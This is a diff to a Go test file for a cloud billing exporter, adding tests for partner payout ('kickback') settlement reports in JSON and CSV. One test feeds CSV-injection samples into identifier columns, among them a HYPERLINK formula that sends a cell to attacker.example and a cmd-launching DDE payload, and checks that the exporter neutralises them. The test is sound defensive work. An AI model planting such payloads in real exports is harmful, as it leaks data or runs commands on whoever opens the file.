@@ -93,7 +93,7 @@ const drDocument = `{"billing_period":{"from":"2026-03-01T00:00:00Z","to":"2026-
 	`"usage":{"disk_gb":200.0000},"cost":{"disk_gb":22.32,"total":22.32},"state_modifier":1.0000}],` +
 	`"total":22.32}],"related_costs":[],"total":22.32,"currency":"EUR"}`
 
-// The two header rows, spelled out here rather than read off the writers: the
+// The three header rows, spelled out here rather than read off the writers: the
 // column order is what an ERP's import mapping is written against, so a case
 // states it rather than agreeing with whatever the code emits.
 const (
@@ -101,6 +101,8 @@ const (
 		"resource_type,resource_id,project_id,state,from_ts,to_ts,dimension,quantity,amount,currency"
 	deltasHeader = "run_id,corrects_run_id,period_from,period_to,cloud,platform," +
 		"resource_type,resource_id,project_id,dimension,old_amount,new_amount,delta,currency"
+	kickbacksHeader = "run_id,kind,corrects_run_id,period_from,period_to,beneficiary,cloud," +
+		"project_id,relation_id,scope,rate,base,amount,currency"
 )
 
 // The file names the two writers produce over the fixtures.
@@ -260,6 +262,46 @@ func kickback(beneficiary, cloud, projectID string, relationID uuid.UUID,
 		Base:         decimal.RequireFromString(base),
 		Amount:       decimal.RequireFromString(amount),
 	}
+}
+
+// kickbackRun is the March run above with a settlement under it: what
+// partner-corp is owed off three projects in two clouds, over four relations
+// and two scopes, and what partner-two is owed off one project. Two partners
+// and two clouds are what the grouping is read over: a report that summed one
+// partner's projects into the other's, or one that dropped the cloud from the
+// pair, bills somebody else's payout to the partner.
+func kickbackRun(t *testing.T) export.Run {
+	t.Helper()
+
+	run := regularRun(t)
+	run.Kickbacks = []export.Kickback{
+		kickback("partner-corp", "os-dr", "customer-proj-1", relation3, "openstack.instance",
+			"0.05", "200.00", "10.00"),
+		kickback("partner-corp", "os-prod", "customer-proj-1", relation1, "all",
+			"0.10", "1020.00", "102.00"),
+		kickback("partner-corp", "os-prod", "customer-proj-2", relation2, "all",
+			"0.10", "500.00", "50.00"),
+		kickback("partner-corp", "os-prod", "customer-proj-2", relation5, "openstack.volume",
+			"0.10", "100.00", "10.00"),
+		kickback("partner-two", "os-prod", "customer-proj-2", relation4, "all",
+			"0.02", "500.00", "10.00"),
+	}
+	return run
+}
+
+// kickbackCorrectionRun is the correction of that month: the two differences it
+// owes back, both negative, because the correction re-rated the usage down.
+func kickbackCorrectionRun(t *testing.T) export.Run {
+	t.Helper()
+
+	run := correctionRun(t)
+	run.Kickbacks = []export.Kickback{
+		kickback("partner-corp", "os-prod", "customer-proj-1", relation1, "all",
+			"0.10", "-20.40", "-2.04"),
+		kickback("partner-corp", "os-prod", "customer-proj-2", relation2, "all",
+			"0.10", "-500.00", "-50.00"),
+	}
+	return run
 }
 
 // kickbackRow is one kickback as a case compares it: every column, at the scale
@@ -1186,6 +1228,201 @@ func TestDiffKickbacks(t *testing.T) {
 	}
 }
 
+// TestKickbacksGolden pins the bytes both renderers produce, over a settlement
+// and over the correction of one. The document is what a partner is paid
+// against, so a change to a member, a column, an order or a scale is a change
+// to somebody's payout: it has to show up here rather than in their next
+// remittance.
+func TestKickbacksGolden(t *testing.T) {
+	cases := []struct {
+		name   string
+		render func(run export.Run) ([]byte, error)
+		run    func(t *testing.T) export.Run
+		golden string
+	}{
+		{
+			name:   "the document of a settlement",
+			render: export.KickbacksJSON,
+			run:    kickbackRun,
+			golden: "regular.json",
+		},
+		{
+			name:   "the table of a settlement",
+			render: export.KickbacksCSV,
+			run:    kickbackRun,
+			golden: "regular.csv",
+		},
+		{
+			name:   "the document of a correction",
+			render: export.KickbacksJSON,
+			run:    kickbackCorrectionRun,
+			golden: "correction.json",
+		},
+		{
+			name:   "the table of a correction",
+			render: export.KickbacksCSV,
+			run:    kickbackCorrectionRun,
+			golden: "correction.csv",
+		},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got, err := c.render(c.run(t))
+			if err != nil {
+				t.Fatalf("rendering the settlement: %v", err)
+			}
+			want := read(t, filepath.Join("testdata", "golden", "kickbacks", c.golden))
+			if !bytes.Equal(got, want) {
+				t.Errorf("%s =\n%s\nwant\n%s", c.golden, got, want)
+			}
+		})
+	}
+}
+
+// TestKickbacksJSONWithoutKickbacks pins what a run that owes nobody renders: a
+// beneficiary list that is empty rather than null. An empty list is one a
+// partner's importer iterates over without a case for the missing value.
+func TestKickbacksJSONWithoutKickbacks(t *testing.T) {
+	cases := []struct {
+		name string
+		run  func(t *testing.T) export.Run
+	}{
+		{name: "a run that settled nothing", run: regularRun},
+		{
+			name: "a run whose settlement is nil",
+			run: func(t *testing.T) export.Run {
+				run := kickbackRun(t)
+				run.Kickbacks = nil
+				return run
+			},
+		},
+		{
+			name: "a run whose settlement is empty",
+			run: func(t *testing.T) export.Run {
+				run := kickbackRun(t)
+				run.Kickbacks = []export.Kickback{}
+				return run
+			},
+		},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			body, err := export.KickbacksJSON(c.run(t))
+			if err != nil {
+				t.Fatalf("KickbacksJSON() error = %v, want nil", err)
+			}
+			if want := `"beneficiaries": []`; !strings.Contains(string(body), want) {
+				t.Errorf("KickbacksJSON() =\n%s\nwant it to carry %s", body, want)
+			}
+		})
+	}
+}
+
+// TestKickbacksCSVWithoutRows pins the header-only table, for the reason
+// TestCSVFilesWithoutRows pins the other two.
+func TestKickbacksCSVWithoutRows(t *testing.T) {
+	body, err := export.KickbacksCSV(regularRun(t))
+	if err != nil {
+		t.Fatalf("KickbacksCSV() error = %v, want nil", err)
+	}
+	if got, want := string(body), kickbacksHeader+"\n"; got != want {
+		t.Errorf("KickbacksCSV() = %q, want %q", got, want)
+	}
+}
+
+// TestKickbacksRenderInOneOrder pins that the bytes are a function of what the
+// run settles rather than of the order the kickbacks were handed over in. The
+// loader orders them, and a report a partner reconciles against the month
+// before it has to read the same either way.
+func TestKickbacksRenderInOneOrder(t *testing.T) {
+	cases := []struct {
+		name   string
+		render func(run export.Run) ([]byte, error)
+	}{
+		{name: "the document", render: export.KickbacksJSON},
+		{name: "the table", render: export.KickbacksCSV},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			want, err := c.render(kickbackRun(t))
+			if err != nil {
+				t.Fatalf("rendering the settlement: %v", err)
+			}
+			reversed := kickbackRun(t)
+			slices.Reverse(reversed.Kickbacks)
+
+			got, err := c.render(reversed)
+			if err != nil {
+				t.Fatalf("rendering the reversed settlement: %v", err)
+			}
+			if !bytes.Equal(got, want) {
+				t.Errorf("the reversed settlement renders\n%s\nwant\n%s", got, want)
+			}
+		})
+	}
+}
+
+// TestKickbacksCSVRefusesAFormulaToTheSpreadsheet pins the identifier columns
+// of the settlement table, for the reason the rated.csv case above pins its
+// own. A beneficiary and a scope come out of an adjustments document, a cloud
+// and a project id out of an event stream, and this table is the one whoever
+// pays the partners opens in a spreadsheet.
+func TestKickbacksCSVRefusesAFormulaToTheSpreadsheet(t *testing.T) {
+	const (
+		formula  = `=HYPERLINK("http://attacker.example/"&A1,"invoice")`
+		command  = `@SUM(1+9)*cmd|' /c calc'!A1`
+		plus     = "+1+1"
+		minus    = "-1+1"
+		tabbed   = "\t=1+1"
+		returned = "\r=1+1"
+	)
+
+	cases := []struct {
+		name   string
+		column int
+		set    func(kickback *export.Kickback, value string)
+	}{
+		{name: "beneficiary", column: 5, set: func(k *export.Kickback, v string) { k.Beneficiary = v }},
+		{name: "cloud", column: 6, set: func(k *export.Kickback, v string) { k.Cloud = v }},
+		{name: "project_id", column: 7, set: func(k *export.Kickback, v string) { k.ProjectID = v }},
+		{name: "scope", column: 9, set: func(k *export.Kickback, v string) { k.Scope = v }},
+	}
+
+	for _, c := range cases {
+		for _, value := range []string{formula, command, plus, minus, tabbed, returned} {
+			t.Run(c.name+" holding "+value, func(t *testing.T) {
+				run := kickbackRun(t)
+				entry := run.Kickbacks[0]
+				c.set(&entry, value)
+				run.Kickbacks = []export.Kickback{entry}
+
+				rows := kickbackTable(t, run)
+				if len(rows) != 2 {
+					t.Fatalf("the table holds %d rows, want the header and one kickback", len(rows))
+				}
+				// The value reaches an importer whole, under the prefix that keeps a
+				// spreadsheet from evaluating it.
+				if got, want := rows[1][c.column], "'"+value; got != want {
+					t.Errorf("%s = %q, want %q", c.name, got, want)
+				}
+			})
+		}
+	}
+
+	t.Run("the amount a correction takes back keeps its minus", func(t *testing.T) {
+		rows := kickbackTable(t, kickbackCorrectionRun(t))
+		// Column twelve is amount, on the first row the order returns, which is the
+		// difference over customer-proj-1. It is a number, so it does not go
+		// through the prefix: a leading minus there is what the partner owes back.
+		if got, want := rows[1][12], "-2.04"; got != want {
+			t.Errorf("amount = %q, want %q", got, want)
+		}
+	})
+}
+
 // jsonFiles and csvFiles are the two writers over one directory, as the cases
 // hand them around.
 func jsonFiles(dir string) export.BillingExporter { return export.JSONFiles{Dir: dir} }
@@ -1270,6 +1507,22 @@ func readCSV(t *testing.T, path string) [][]string {
 	rows, err := csv.NewReader(bytes.NewReader(read(t, path))).ReadAll()
 	if err != nil {
 		t.Fatalf("reading %s back: %v", path, err)
+	}
+	return rows
+}
+
+// kickbackTable is one rendered settlement, parsed: the header row and the rows
+// under it, the way readCSV parses a written one.
+func kickbackTable(t *testing.T, run export.Run) [][]string {
+	t.Helper()
+
+	body, err := export.KickbacksCSV(run)
+	if err != nil {
+		t.Fatalf("KickbacksCSV() error = %v, want nil", err)
+	}
+	rows, err := csv.NewReader(bytes.NewReader(body)).ReadAll()
+	if err != nil {
+		t.Fatalf("reading the settlement back: %v", err)
 	}
 	return rows
 }
